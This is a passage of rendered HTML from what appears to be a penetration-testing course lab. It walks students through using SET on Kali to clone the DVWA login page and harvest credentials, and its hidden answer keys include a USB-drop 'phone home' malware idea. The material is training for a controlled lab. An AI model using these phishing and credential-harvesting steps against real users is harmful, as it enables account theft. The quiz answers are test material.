+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->Answers will vary. The penetration tester could create and distribute some sort of benign malware on USB drives. The drives could be dropped in the parking lot and other open areas of the client facility. If the malware had a “phone home” functionality, the number of instances in which the USB drives were inserted into corporate computers could be quantified and reported.
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bee7d0bbb8e0fca7afcde" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bee7d0bbb8e0fca7afcde" class="645bee7d0bbb8e0fca7afcde block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bee7d0bbb8e0fca7afcde" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bee7d0bbb8e0fca7afcde-heading-view" headingtitle="Part 1 Step 2" modelid="645bee7d0bbb8e0fca7afcde" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 1 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645bee7d0bbb8e0fca7afcdf" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645bee7d0bbb8e0fca7afcdf" class="component text 645bee7d0bbb8e0fca7afcdf remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bee7d0bbb8e0fca7afcdf-heading-view" headingtitle="Part 1 Step 2" modelid="645bee7d0bbb8e0fca7afcdf" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 1 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><p>You are now ready to begin the web site cloning exploit.</p></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645befa3dbe8730ff8395362" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645befa3dbe8730ff8395362" class="645befa3dbe8730ff8395362 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645befa3dbe8730ff8395362" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645befa3dbe8730ff8395362-heading-view" headingtitle="Part 2 Step 1" modelid="645befa3dbe8730ff8395362" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645befa3dbe8730ff8395363" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645befa3dbe8730ff8395363" class="component text 645befa3dbe8730ff8395363 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645befa3dbe8730ff8395363-heading-view" headingtitle="Part 2 Step 1" modelid="645befa3dbe8730ff8395363" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h2 style="margin-left:0in"><!--[if !supportLists]--><span><span>Part 2: </span></span><!--[endif]-->Clon<span class="msoIns">ing</span> a Website to Obtain User Credentials</h2><p style="margin-left:0in !msorm; margin-right:0in !msorm"><span><span class="msoIns">In thi</span></span><span><span><span class="msoIns"><span>s part of the lab, you will create a perfect copy of the login page for a </span></span></span></span><span><span><span class="msoIns"><span>website. The fake login page will gather all credentials submitted to it and then redirect the us</span></span></span></span><span><span><span class="msoIns"><span>er to the real website.</span></span></span></span></p><h3 style="margin-left:0in"><!--[if !supportLists]--><span><span>Step 1: </span></span><!--[endif]-->Investigate Web Attack Vectors in SET<span class="msoIns">.</span></h3><ol start="1" style="list-style-type:lower-alpha"><li><!--[if !supportLists]-->From the Social-Engineering Attacks submenu, choose <strong>2) Web<span class="msoIns">site</span> Attack Vectors</strong> to begin the web site cloning exploit.</li></ol><pre style="margin-left:40px">set&gt; <strong>2</strong></pre><ol start="2" style="list-style-type:lower-alpha"><li><!--[if !supportLists]--><span class="msoIns">Review the</span><span class="msoDel"> </span>brief <span class="msoIns">attack description</span><span class="msoDel"> </span>of each type of attack<span class="msoIns">.<span class="msoDel"> </span></span></li></ol></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bf02bdbe8730ff8395365" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bf02bdbe8730ff8395365" class="645bf02bdbe8730ff8395365 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bf02bdbe8730ff8395365" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf02bdbe8730ff8395365-heading-view" headingtitle="Part 2 Step 1" modelid="645bf02bdbe8730ff8395365" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645bf02bdbe8730ff8395366" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645bf02bdbe8730ff8395366" class="component opentextbox 645bf02bdbe8730ff8395366 remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645bf02bdbe8730ff8395366" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf02bdbe8730ff8395366-heading-view" headingtitle="Which type of attack will you choose to create a cloned website to obtain login credentials for users on the target network?" modelid="645bf02bdbe8730ff8395366" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Which type of attack will you choose to create a cloned website to obtain login credentials for users on the target network?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->Which type of attack will you choose to create a cloned website to obtain login credentials for users on the target network?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->3) Credential Harvester Attack Method
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bf06b1a0b2f0c9858fac7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bf06b1a0b2f0c9858fac7" class="645bf06b1a0b2f0c9858fac7 block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bf06b1a0b2f0c9858fac7" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf06b1a0b2f0c9858fac7-heading-view" headingtitle="Part 2 Step 1" modelid="645bf06b1a0b2f0c9858fac7" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645bf06b1a0b2f0c9858fac8" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645bf06b1a0b2f0c9858fac8" class="component text 645bf06b1a0b2f0c9858fac8 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf06b1a0b2f0c9858fac8-heading-view" headingtitle="Part 2" modelid="645bf06b1a0b2f0c9858fac8" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><ol start="3" style="list-style-type: lower-alpha;"><li><!--[if !supportLists]--><!--[endif]-->Select <strong>3) Credential Harvester Attack Method</strong> from the menu<span class="msoIns">. </span>A description of the ways to configure this exploit is displayed.</li></ol></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bf0e01a0b2f0c9858faca" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bf0e01a0b2f0c9858faca" class="645bf0e01a0b2f0c9858faca block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bf0e01a0b2f0c9858faca" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf0e01a0b2f0c9858faca-heading-view" headingtitle="Part 2 Step 1" modelid="645bf0e01a0b2f0c9858faca" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 1</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645bf0e01a0b2f0c9858facb" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645bf0e01a0b2f0c9858facb" class="component opentextbox 645bf0e01a0b2f0c9858facb remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645bf0e01a0b2f0c9858facb" class="opentabletextbox remove-top-padding remove-padding-bottom">
+                  <base-view type="component" lowercase_component="openTextBox" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header openTextBox__header">
+              <div class="component__header-inner openTextBox__header-inner">
+                  
+                    <div class=" component__title openTextBox__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf0e01a0b2f0c9858facb-heading-view" headingtitle="Which method enables you to use a custom website for the exploit that you create?" modelid="645bf0e01a0b2f0c9858facb" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Which method enables you to use a custom website for the exploit that you create?</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                </div>
+              </div>
+                  <div class="component__widget openTextBox__widget question-container">
+                      <!--?lit$278323178$--> <div class="openTextBox__preText"><!--?lit$278323178$-->Which method enables you to use a custom website for the exploit that you create?</div>                         
+      
+                      <div class="openTextBox__textArea-container">
+                          <fieldset class="openTextBox__fieldset" tabindex="0">
+                          <legend class="openTextBox__legend">
+                            <!--?lit$278323178$-->Answer Area
+                          </legend>
+                          <textarea class="openTextBox__textArea" rows="3" name="answerArea" placeholder="Enter your answer here" aria-label="Enter your answer here">&lt;!----&gt;&lt;!----&gt;</textarea>
+                          </fieldset>
+                      </div>
+                      <div class="openTextBox__answerText answergray  hide">
+                        <!--?lit$278323178$-->
+                      <!--?lit$278323178$-->The third method 3) Custom Import
+                    </div>
+
+                      <div class="btn__container">                        
+                        <!--?lit$278323178$-->                    
+                      </div>
+                      <!--?lit$278323178$--><!--?-->  
+                  </div>
+              </div>
+            </div>
+          </div>
+        
+      </opentextbox-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645bf122dbe8730ff839537f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645bf122dbe8730ff839537f" class="645bf122dbe8730ff839537f block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645bf122dbe8730ff839537f" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf122dbe8730ff839537f-heading-view" headingtitle="Part 2 Step 2" modelid="645bf122dbe8730ff839537f" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><text-view modelid="645bf122dbe8730ff8395380" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component__header-container">
+            <div data-socialgoodpulse-id="645bf122dbe8730ff8395380" class="component text 645bf122dbe8730ff8395380 remove-top-padding remove-padding-bottom is-full   ">
+                <base-view type="component" lowercase_component="text" model="[object Object]" customclass="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="component__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="component__header text__header">
+              <div class="component__header-inner text__header-inner">
+                  
+                    <div class=" component__title text__title">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645bf122dbe8730ff8395380-heading-view" headingtitle="Part 2 Step 2" modelid="645bf122dbe8730ff8395380" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="component-heading" aria-level="4">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$--> <div class="component__content">
+                      <div tabindex="0" class="component__body text__body">
+                        <div class="component__body-inner text__body-inner"><!--?lit$278323178$--><h3 style="margin-left:0in"><!--[if !supportLists]--><span><span>Step 2: </span></span><!--[endif]-->Clone the DVWA.vm Login Screen<span class="msoIns">.</span></h3><p>In this step, you will create a cloned website that duplicates the DVWA.vm login website. The SET application creates a website hosted on your Kali Linux computer. When the target users enter their credentials in the cloned website, the credentials and the users will be redirected to the real website without being aware of the exploit. This is similar to an on-path attack.</p><ol start="1" style="list-style-type:lower-alpha"><li><!--[if !supportLists]--><p><!--[if !supportLists]-->In this lab, we are using the internal website hosted on the DVWA.vm virtual machine. To see what the website looks like, open the Kali Firefox browser, and enter the URL <strong><span>http://DVWA.vm/</span></strong><span><span><span>.</span></span></span><span> The login screen will appear. If the URL is not found, enter <span>http://10.6.6.13/</span> to access the web server using its IP address.</span></p></li></ol></div>
+                      </div>
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+            </div>
+        </div>
+
+        <!-- div><div class="component__inner"></div></div -->
+        </text-view><!---->
+                            </div>                     
+                    </div>
+                </div>
+            </block-view>
+                                <!----><!---->
+                                    <block-view modelid="645c100c6b521b0d00a5f45c" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="block" style="width: 4.34783%;"><!---->
+                
+                <div data-socialgoodpulse-id="645c100c6b521b0d00a5f45c" class="645c100c6b521b0d00a5f45c block remove-top-padding remove-padding-bottom ">
+                    <div class="block__inner">    
+                    <base-view type="block" modelid="645c100c6b521b0d00a5f45c" model="[object Object]" customclass="" lowercase_component="" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="block__header-wrapper remove-top-padding remove-padding-bottom ">
+        <div class="block__header ">
+              <div class="block__header-inner ">
+                  
+                    <div class=" block__title ">
+                      <!--?lit$278323178$--><heading-view aria-hidden="true" id="645c100c6b521b0d00a5f45c-heading-view" headingtitle="Part 2 Step 2" modelid="645c100c6b521b0d00a5f45c" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme"><!---->
+      <div class="js-heading is-incomplete">
+        <div class="js-heading-inner" role="heading" id="block-heading" aria-level="3">
+        <span class="aria-label"> <!--?lit$278323178$-->Incomplete &nbsp;<!--?lit$278323178$-->Part 2 Step 2</span>
+        </div>
+      </div>
+    </heading-view>
+                      <!--?lit$278323178$-->
+                    </div>
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+                  <!--?lit$278323178$-->
+              </div>
+          </div>
+        </div>
+      
+    </base-view>
+                        <div class="component__container">                            
+                                <!--?lit$278323178$--><!----><opentextbox-view modelid="645c100c6b521b0d00a5f45d" class="is-full remove-top-padding remove-padding-bottom" is-touch="false" fullscreen="true" device="large" browser="Chrome" os="windows" dir="ltr" location="page" theme="dark" orientation="portrait" themetype="article-base-theme" sgpulse-type="component"><!---->
+        <div class="component">
+          <div class="component__inner openTextBox__inner">
+            <div data-socialgoodpulse-id="645c100c6b521b0d00a5f45d" class="component opentextbox 645c100c6b521b0d00a5f45d remove-top-padding remove-padding-bottom is-full   ">
+              <div class="component__header-container">
+                <div data-socialgoodpulse-id="645c100c6b521b0d00a5f45d" class="opentabletextbox remove-top-padding remove-padding-bottom">
